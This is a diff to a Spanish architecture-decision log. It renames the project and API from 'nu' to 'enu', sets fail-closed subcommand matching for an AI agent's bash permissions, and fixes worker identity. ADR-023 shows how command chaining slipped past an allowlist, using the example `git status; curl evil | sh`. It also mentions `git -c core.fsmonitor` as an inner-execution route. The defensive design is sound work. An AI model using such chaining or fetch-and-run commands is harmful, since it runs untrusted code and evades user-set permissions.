@@ -293,7 +293,11 @@ multiplexar autores concurrentes.
 
 ## ADR-009 · Convenciones de la API: namespace global, async por corrutinas, errores estructurados
 
-**Estado:** Propuesta · 2026-06 (se acepta al congelar [api.md](api.md))
+**Estado:** Propuesta · 2026-06 (se acepta al congelar [api.md](api.md)) ·
+**El namespace global `nu` de la decisión 1 queda reemplazado por
+[ADR-022](#adr-022--renombrado-total-del-proyecto-y-de-la-api-nu--enu)**
+(16-jul-2026); el resto de esta entrada (async por corrutinas, errores
+estructurados) sigue vigente sin cambios.
 
 **Contexto.** Antes de escribir código se define formalmente la API v1
 ([api.md](api.md)). Tres decisiones transversales necesitan registro propio.
@@ -358,7 +362,7 @@ equivalente — detalle del loader).
 
 ## ADR-011 · Realización del scheduler: goroutine-por-task + token de ejecución Lua
 
-**Estado:** **Reemplazada por [ADR-020](#adr-020--el-puente--definitivo-tasks-como-corrutinas-lua-nativas-reemplaza-adr-011-en-la-conmutación)** · la conmutación **M16** hizo de wasm el backend por defecto y la retirada **M17** ([migracion-vm.md](migracion-vm.md)) eliminó gopher-lua del `go.mod` y del binario, borrando el scheduler goroutine-por-task que este ADR realizaba; el puente ⏸ definitivo (tasks como corrutinas Lua nativas) lo describe ahora ADR-020. Como manda el flujo del proyecto, el cuerpo no se reescribe: queda como registro histórico de *cómo* se realizó ADR-004 sobre gopher-lua. · Originalmente Aceptada · 2026-06 (refinaba *cómo* se realiza ADR-004 sobre
+**Estado:** **Reemplazada por [ADR-020](#adr-020--el-puente--definitivo-tasks-como-corrutinas-lua-nativas-reemplaza-adr-011-en-la-conmutación)** · la conmutación **M16** hizo de wasm el backend por defecto y la retirada **M17** ([migracion-vm.md](archive/migracion-vm.md)) eliminó gopher-lua del `go.mod` y del binario, borrando el scheduler goroutine-por-task que este ADR realizaba; el puente ⏸ definitivo (tasks como corrutinas Lua nativas) lo describe ahora ADR-020. Como manda el flujo del proyecto, el cuerpo no se reescribe: queda como registro histórico de *cómo* se realizó ADR-004 sobre gopher-lua. · Originalmente Aceptada · 2026-06 (refinaba *cómo* se realiza ADR-004 sobre
 gopher-lua; no cambiaba su semántica observable ni la API de [api.md](api.md))
 
 **Contexto.** ADR-004 fijó el "modelo del navegador" (estado Lua principal
@@ -557,7 +561,7 @@ su tubería.
    soporte.
 
 3. **Versionado — estrategia "constantes como fuente de verdad".** La versión
-   vive en las constantes de `internal/runtime/nu.go` (`VersionMajor/Minor/Patch`,
+   vive en las constantes de `internal/runtime/enu.go` (`VersionMajor/Minor/Patch`,
    expuestas como `nu.version`). El release **no inyecta** la versión por
    `-ldflags -X`: la **verifica** contra el tag en un job-gate y aborta si
    divergen. El gate lee la versión **ejecutando el runtime**
@@ -601,7 +605,7 @@ su tubería.
   de depender solo de la diligencia manual: la CI lo exige en cada PR. El
   `tidy`-check materializa "cero dependency hell" como gate automático.
 - **Publicar implica subir la versión a mano antes del tag.** El flujo es: editar
-  las constantes en `nu.go`, commit, tag `vX.Y.Z`, push. Si el tag no coincide,
+  las constantes en `enu.go`, commit, tag `vX.Y.Z`, push. Si el tag no coincide,
   el release falla en el gate con un mensaje accionable y no publica nada. Es una
   fricción deliberada (una verificación, no un automatismo que adivine).
 - **macOS en la matriz cuesta más minutos** que Linux. Para un repo de un solo
@@ -1052,7 +1056,7 @@ tablas 0,41×), peajes concentrados en las fronteras (llamada host ~1 µs, throw
 
 ## ADR-020 · El puente ⏸ definitivo: tasks como corrutinas Lua nativas (reemplaza ADR-011 en la conmutación)
 
-**Estado:** Aceptada · 2026-07 (diseña el puente ⏸ del backend wasm de [ADR-019]; **reemplaza a [ADR-011](#adr-011--realización-del-scheduler-goroutine-por-task--token-de-ejecución-lua)** cuando wasm sea la VM por defecto —conmutación M16 de [migracion-vm.md](migracion-vm.md)—; hasta entonces ambos coexisten tras el selector de backend, ADR-011 para gopher y este para wasm). No cambia la semántica observable de [api.md](api.md) §1.3 ni ninguna firma.
+**Estado:** Aceptada · 2026-07 (diseña el puente ⏸ del backend wasm de [ADR-019]; **reemplaza a [ADR-011](#adr-011--realización-del-scheduler-goroutine-por-task--token-de-ejecución-lua)** cuando wasm sea la VM por defecto —conmutación M16 de [migracion-vm.md](archive/migracion-vm.md)—; hasta entonces ambos coexisten tras el selector de backend, ADR-011 para gopher y este para wasm). No cambia la semántica observable de [api.md](api.md) §1.3 ni ninguna firma.
 
 **Contexto.** ADR-011 realizó el scheduler *sin yields* —goroutine por task + un token de ejecución— porque gopher-lua (Lua 5.1 reimplementado) **no deja que una corrutina ceda a través de un `pcall`** (grieta [G31](problemas.md#g31)). Fue un rodeo forzado: el "puente de corrutinas" que ADR-004 anticipó como el modelo natural no se pudo construir. El spike de ADR-019 demostró (test 🔒 `TestYieldATravesDePcall`, M02) que **el Lua oficial de PUC sobre wazero SÍ cede a través de `pcall`**: la grieta G31 no existe en la implementación de referencia. Por tanto el backend wasm puede —y debe— realizar el puente como ADR-004 quería.
 
@@ -1105,3 +1109,204 @@ exclusiones ni directivas `nolint` para alcanzar el cero.
   demostrar de nuevo el baseline completo.
 - La política endurece el gate de calidad previo a v1, pero no modifica ninguna
   firma, semántica o versión de la API sagrada.
+
+---
+
+## ADR-022 · Renombrado total del proyecto y de la API: `nu` → `enu`
+
+**Estado:** Aceptada · 2026-07-16 (**reemplaza** la decisión 1 de
+[ADR-009](#adr-009--convenciones-de-la-api-namespace-global-async-por-corrutinas-errores-estructurados);
+no toca sus decisiones 2 y 3)
+
+**Contexto.** El nombre `nu` colisiona en el `PATH` con el binario de
+**Nushell** y, en menor medida, con el Lisp histórico `Nu`
+([docs/audits/analisis-nombres-2026-07-15.md](../docs/audits/analisis-nombres-2026-07-15.md),
+que resuelve R-04 de la auditoría de promoción). El estudio de renombrado
+recorrió el cementerio de descartes, un ranking de 77 nombres vírgenes y el
+análisis profundo de cinco finalistas; el propietario decidió el 16 de julio
+de 2026 el nombre **`enu`** (wordmark **`e/nu`**, backronym *Extensible
+Native Userland* — detalle en el §10 de ese análisis). El proyecto sigue en
+fase de diseño (pre-1.0, sin usuarios que migrar), así que no hay
+instalaciones que preservar ni razón para pagar el coste permanente de un
+shim de compatibilidad.
+
+**Decisión.** Renombrado total, de una vez, en bloque:
+
+1. **El namespace global de la API pasa de `nu` a `enu`**: todo módulo y
+   función de la superficie sagrada cambia de `nu.<modulo>` a
+   `enu.<modulo>` (`enu.fs`, `enu.task`, `enu.ui`, `enu.http`, `enu.events`,
+   `enu.version` — incluida `enu.version.api` —, `enu.plugin`, `enu.worker`,
+   `enu.search`, `enu.config`, `enu.ws`, `enu.log`, `enu.re`, `enu.sys`,
+   `enu.text`, `enu.proc`, `enu.json`, `enu.yaml`, `enu.eval`, `enu.has`,
+   etc.). Esto **reemplaza la decisión 1 de ADR-009**; sus decisiones 2
+   (async por corrutinas) y 3 (errores estructurados) no cambian.
+2. **El binario, el nombre de producto y el module path pasan a `enu`**: el
+   binario ejecutable se llama `enu` (ya sin colisión de `PATH`), y el
+   `module` de Go se renombra en consecuencia.
+3. **Las rutas en disco siguen al namespace**: ficheros de configuración
+   `nu.toml` → `enu.toml`, contexto de proyecto `nu.md` → `enu.md`,
+   directorios de proyecto `.nu/` → `.enu/`, referencias git de `mesh`
+   `refs/nu/` → `refs/enu/`, y los directorios estándar de usuario
+   `~/.config/nu` → `~/.config/enu`, `~/.local/share/nu` →
+   `~/.local/share/enu` (o equivalentes por plataforma).
+4. **Sin shim de compatibilidad.** No se acuña un alias `nu.*` que reenvíe a
+   `enu.*`, ni un symlink `nu` → `enu` del binario, ni lectura de fallback
+   de `nu.toml`/`.nu/`. Antes de v1 no hay compromiso de compatibilidad que
+   proteger, y un shim solo aplazaría el coste (y la superficie sagrada) sin
+   necesidad.
+
+**Consecuencias.**
+
+- Esto **rompe deliberadamente** la regla "la API del core crece solo por
+  adición" (idea central 4 de [CLAUDE.md](../CLAUDE.md)) — pero de forma
+  consciente y de una sola vez, **antes** de congelar v1 (el punto en el que
+  esa regla empieza a regir en serio). No es un precedente para romper
+  firmas después de congelar.
+- Todo el pseudocódigo de [pseudocodigo.md](pseudocodigo.md) y los contratos
+  (`api.md`, `agente.md`, `providers.md`, `sesiones.md`, `chat.md`,
+  `guia-plugins.md`, `malla.md`) migran en bloque al namespace `enu.*` y a
+  las rutas en disco `enu`/`.enu`; no queda un periodo mixto documentado.
+- Los ADR previos que citan `nu.*` como namespace vigente (ADR-009 y
+  cualquier otro que lo dé por hecho en su prosa) **no se reescriben**: son
+  el registro histórico de lo que se decidió *entonces*: ADR-009 queda
+  marcado como reemplazado en su decisión 1 por este ADR, sin tocar su
+  cuerpo. La lectura correcta de cualquier ADR anterior que mencione
+  `nu.algo` es "sustitúyase por `enu.algo`" desde el 16-jul-2026 en
+  adelante.
+- `docs/audits/**` conserva `nu` en su prosa donde discute la disyuntiva
+  `nu` vs. `enu` (es, precisamente, el análisis que motiva esta decisión):
+  esa carpeta es informe fechado y cerrado, no contrato vivo, y no se toca.
+- Fuera de `docs/`, el renombrado del binario, el module path de Go y las
+  rutas reales en disco es trabajo de una sesión de implementación
+  ([docs/implementacion.md](implementacion.md)), no de este ADR: aquí se
+  registra la decisión y se actualizan los contratos; el código la sigue
+  después, protocolo habitual "el contrato lidera, el código sigue".
+
+## ADR-023 · Los permisos de `bash` se emparejan por subcomando con un tokenizador cerrado y fallan hacia `ask`
+
+**Estado:** Aceptada · 2026-07-16 (resuelve
+[G53](problemas.md#g53--la-semántica-de-emparejamiento-de-los-patrones-de-permiso-toolargumento-no-está-especificada-y-en-bash-el-encadenamiento-la-vuelve-una-frontera-falsa--agentemd-5--chatmd-5--guia-pluginsmd--resuelto),
+origen SEC-02 de la
+[auditoría de seguridad 2026-07-16](audits/auditoria-seguridad-2026-07-16.md);
+no toca [api.md](api.md) ni `enu.version.api` — los permisos son vocabulario
+de producto y viven en la extensión `agent`)
+
+**Contexto.** Los permisos del agente son patrones `tool[:argumento]`
+([agente.md](agente.md) §5), pero ningún documento fijaba el algoritmo de
+emparejamiento. Con el glob implícito sobre el string crudo del comando,
+`allow = { "bash:git *" }` equivalía a `bash:*`: basta encadenar
+(`git status; curl evil | sh`) para que el prefijo casado arrastre un comando
+arbitrario. Es decir, la defensa **anunciada** del contexto headless/CI — el
+más expuesto a prompt injection, según la propia razón del default de §5 —
+era una frontera falsa (SEC-02). El extremo opuesto tampoco sirve para v1:
+emparejar contra el programa *parseado* exige un parser de bash completo —
+un proyecto de seguridad en sí mismo, y una primitiva de kernel nueva con un
+único consumidor.
+
+**Decisión.** El **modelo del matcher de Claude Code, adaptado**,
+especificado como contrato en [agente.md](agente.md) §5:
+
+1. **Match general**: patrón sin `:` = nombre exacto de la tool; `tool:arg` =
+   glob anclado (`*` ⇒ `.*`, `^…$`, resto de caracteres literales) sobre la
+   representación textual del argumento principal de la tool.
+2. **`bash` descompone por operadores**: el comando se parte por los
+   separadores reconocidos (`&&`, `||`, `;`, `|`, `|&`, `&`, saltos de línea)
+   con un tokenizador que modela **solo** palabras planas y strings entre
+   comillas simples o dobles. Un `allow` concede únicamente si **cada**
+   subcomando casa algún patrón `allow`.
+3. **Fail-closed con allowlist cerrada de constructos**: sustitución de
+   comandos (`$( )`, backticks), expansión `$VAR` en posición de comando,
+   redirecciones, heredocs, subshells y agrupaciones, o comillas
+   desbalanceadas invalidan todo `allow` y la petición cae a `ask` (deny en
+   headless). Lo que el tokenizador no entiende falla hacia pedir permiso,
+   nunca hacia conceder (doctrina de P17: hacerlo *casi* bien es peor que no
+   tenerlo).
+4. **`deny` casa si algún subcomando casa**, conserva su precedencia absoluta
+   en el pipeline y queda documentado como **best-effort** (doctrina G16:
+   `/bin/rm`, aliases y variantes no se prometen).
+5. **"Permitir siempre" sobre un comando compuesto persiste una regla por
+   subcomando** ([chat.md](chat.md) §5, P29), no el string encadenado.
+
+El salto al programa parseado queda pospuesto con disparador doble
+([P39](pospuesto.md)).
+
+**Consecuencias.**
+
+- El encadenamiento deja de ser bypass: `allow = { "bash:git *" }` vuelve a
+  significar lo que su sintaxis sugiere, y la promesa de §5 ("auditable de un
+  vistazo") vuelve a ser cierta para lo que el allowlist nombra.
+- El precio del fail-closed es fricción: comandos legítimos con constructos
+  no modelables caen a `ask` (y en headless, a deny). Esa fricción, si se
+  documenta y duele, es exactamente el disparador de P39 — el diseño convierte
+  su propio coste en la señal de reapertura.
+- La **advertencia honesta** queda en los contratos ([agente.md](agente.md)
+  §5, [guia-plugins.md](guia-plugins.md)): ni `allow` ni `deny` acotan lo que
+  un binario permitido ejecuta por dentro (`git -c core.fsmonitor=…`, hooks
+  de git, `postinstall` de npm). El emparejamiento decide qué comandos
+  arrancan; la valla dura para código no confiable siguen siendo los workers
+  con `caps` — la distinción capa blanda / capa dura que §5 ya hacía.
+- La lista de separadores y constructos modelables es **cerrada por
+  contrato**: ampliarla es un cambio de contrato (revisión de §5 y, si
+  procede, nueva entrada aquí), no un detalle de implementación. Un
+  tokenizador que "entendiera más" sin registro reabriría la grieta en
+  silencio.
+- "Nombre exacto, sin glob" deja sin efecto el patrón
+  `allow = {"mcp__<servidor>__*"}` que [arquitectura.md](arquitectura.md)
+  ejemplificaba para autorizar un servidor MCP entero (actualizado):
+  autorizarlo es enumerar sus tools o conceder por hook `permission`. Es
+  deliberado — un glob sobre nombres reintroduciría por la puerta de atrás
+  la ambigüedad de match que este ADR cierra.
+---
+
+## ADR-024 · Identidad de un worker: foto del plugin dueño en el spawn, inmutable
+
+**Estado:** Aceptada · 2026-07-16 · resuelve G56 (SEC-07; cierra de paso SEC-05)
+
+**Contexto.** Un worker (ADR-004, ADR-008) es un mini-runtime sin
+`enu.plugin` ni ciclo de vida: su pila de dueños es intrínsecamente vacía.
+Pero varias primitivas [W] atribuyen por dueño — `enu.log` anota el plugin de
+origen; `enu.proc` registra los procesos por owner para que `plugin.reload`
+los suelte (G2) — y necesitan una identidad también dentro de un worker. El
+contrato callaba, y la implementación rellenó el hueco leyendo
+`rt.ownerStack` del runtime padre desde la goroutine del worker: atribución
+no determinista (vale lo que el principal esté haciendo en ese instante) y
+una carrera de datos entre hilos. La auditoría de seguridad de 2026-07-16 lo
+señaló como grieta de diseño (SEC-07, raíz común del data race SEC-05), y
+abrió G56.
+
+**Decisión.** La identidad de un worker es una **foto tomada en el spawn**:
+`enu.worker.spawn` captura el plugin dueño vigente en el estado principal —
+donde la pila de dueños es coherente por construcción, al ser single-threaded
+(ADR-004)— y el worker la porta **inmutable** durante toda su vida. Toda
+primitiva [W] atribuida por dueño usa esa identidad fija; en los artefactos
+de atribución se anota distinguible como `<plugin> (worker)` (p. ej.
+`agent (worker)`). Los procesos lanzados por un worker quedan registrados
+bajo su plugin dueño, de modo que `plugin.reload` los alcanza igual que a
+los del estado principal.
+
+Alternativas descartadas: un owner fijo `"worker"` (determinista, pero ciego
+— pierde qué plugin lo lanzó y saca esos procesos del alcance de `reload`:
+fuga de supervisión); el nombre del módulo como owner (el módulo no es
+identidad ante el loader — la identidad es el nombre del plugin, G26); negar
+la atribución en workers (`log`/`proc` [W] de segunda clase, procesos
+huérfanos sin dueño); y serializar con un candado la lectura de la pila viva
+del padre (taparía la carrera, pero no el no-determinismo, que es el
+problema de fondo).
+
+**Consecuencias.**
+
+- La lectura en vivo de estado del runtime padre desde la goroutine del
+  worker queda **prohibida por contrato**: la identidad viaja copiada en el
+  spawn, exactamente como los mensajes (ADR-008). El data race de SEC-05
+  desaparece por diseño, no por candado.
+- Atribución determinista y auditable: cada línea de log y cada proceso dice
+  quién *y desde dónde*, sin depender de lo que el principal hiciera en el
+  instante del cruce.
+- El árbol de supervisión no tiene fugas por la frontera del worker: el
+  estado principal posee todos los workers (P11) y `plugin.reload` sigue
+  soltando también lo que sus workers crearon.
+- Es aclaración semántica de contrato, no firma nueva: `enu.version.api` no
+  se mueve.
+- Regla para superficie futura: cualquier primitiva [W] que en adelante
+  atribuya por dueño usa esta misma identidad capturada — no se inventan
+  identidades ad hoc por módulo.
